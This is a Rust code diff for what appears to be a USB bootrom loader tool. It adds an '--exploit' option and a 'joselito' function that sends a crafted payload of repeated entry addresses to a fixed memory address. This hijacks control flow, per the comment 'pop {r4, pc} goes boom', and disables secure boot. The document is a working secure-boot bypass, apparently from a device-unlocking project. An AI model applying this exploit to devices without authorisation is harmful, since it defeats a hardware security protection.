@@ -44,6 +44,10 @@ struct Cli {
     /// Sync with stock tboot
     #[arg(short, long)]
     stock: bool,
+
+    /// Run Joselito to disable secure boot
+    #[arg(short, long)]
+    exploit: bool,
 }
 
 fn get_dev() -> Result<Option<DeviceInfo>> {
@@ -87,6 +91,23 @@ fn jumpout(r: &mut EpIn, w: &mut EpOut, addr: u32) -> Result<()> {
     if r.read_u8()? == JUMP_ACCEPTED { Ok(()) } else { Err(Error::JumpNotAccepted) }
 }
 
+fn joselito(r: &mut EpIn, w: &mut EpOut, addr: u32) -> Result<()> {
+    println!("Joselito run");
+
+    let entry = addr.to_le_bytes();
+    let mut payload = vec![];
+
+    for _ in (0..0x20).step_by(4) {
+        payload.extend_from_slice(&entry);
+    }
+
+    /* pop {r4, pc} goes boom */
+    send_image(r, w, 0x81FD0, &payload, 0x2000)?;
+    println!("Secure boot is disabled");
+
+    Ok(())
+}
+
 fn entry() -> Result<()> {
     let cli = Cli::parse();
 
@@ -108,18 +129,35 @@ fn entry() -> Result<()> {
 
     let mut payload = fs::read(cli.stage1)?;
 
-    if let Err(_) = Header::try_read(&payload) {
-        let mut header = Header::default();
-        let size = size_of::<Header>();
-        header.entry = STAGE1_BASE + size as u32 | 1;
-        header.data_size = payload.len() as u32;
+    let size = size_of::<Header>();
+    match Header::try_read(&payload[..size]) {
+        Ok(header) => {
+            if cli.exploit {
+                // we don't want header here
+                joselito(&mut reader, &mut writer, header.entry)?;
+            } else {
+                // bootrom expects header
+            }
+        }
+        Err(_) => {
+            if cli.exploit {
+                joselito(&mut reader, &mut writer, STAGE1_BASE | 1)?;
+            } else {
+                let mut header = Header::default();
+                header.entry = STAGE1_BASE + size as u32 | 1;
+                header.data_size = payload.len() as u32;
 
-        payload.reserve(size as usize);
+                payload.reserve(size);
 
-        if let Err(e) = header.write_to(&mut payload[0..size as usize]).map_err(|_| Error::Zerocopy) {
-            eprintln!("Error on appending header: {e}");
-        } else {
-            println!("Appended header to the image, size: {:#x}", size);
+                if let Err(e) = header.write_to(&mut payload[0..size]).map_err(|_| Error::Zerocopy) {
+                    eprintln!("Error on appending header: {e}");
+                } else {
+                    println!("Appended header to the image, size: {:#x}", size);
+                    println!("===============================================");
+                    println!("{header}");
+                    println!("===============================================");
+                }
+            }
         }
     }
 
